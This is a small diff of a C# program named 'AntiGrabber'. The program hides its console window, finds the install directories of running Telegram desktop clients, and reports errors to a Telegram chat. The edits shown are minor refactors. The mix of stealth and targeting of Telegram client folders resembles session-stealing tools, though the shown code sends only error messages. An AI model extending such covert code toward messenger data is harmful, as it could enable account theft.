@@ -34,7 +34,7 @@ namespace AntiGrabber
 
         private static readonly string[] ProcessNames = { "Telegram", "AyuGram", "Telegram Desktop", "AyuGram Desktop", "Unigram", "Unigram Desktop", "Kotatogram", "Kotatogram Desktop", "Telegreat", "Telegreat Desktop", "Telefuel", "Telefuel Desktop", "Bettergram Desktop", "Bettergram" };
 
-        static async Task Main()
+        static async Task Main(string[] args)
         {
             IntPtr handle = GetConsoleWindow();
             if (handle != IntPtr.Zero)
@@ -64,7 +64,9 @@ namespace AntiGrabber
             }
             catch (Exception ex)
             {
-                await SendTelegramMessage("⚠ *Ошибка!* " + ex.Message + "\n🔍 Подробности: `" + ex.StackTrace + "`");
+                    _ = Task.Run(async () => {
+                    await SendTelegramMessage("⚠ *Ошибка!* " + ex.Message + "\n🔍 Подробности: `" + ex.StackTrace + "`");
+                });
             }
         }
 
@@ -126,7 +128,7 @@ namespace AntiGrabber
                 {
                     try
                     {
-                        string processPath = process.MainModule?.FileName;
+                        string processPath = process.MainModule != null ? process.MainModule.FileName : null;
                         if (!string.IsNullOrEmpty(processPath))
                         {
                             string processDir = Path.GetDirectoryName(processPath);
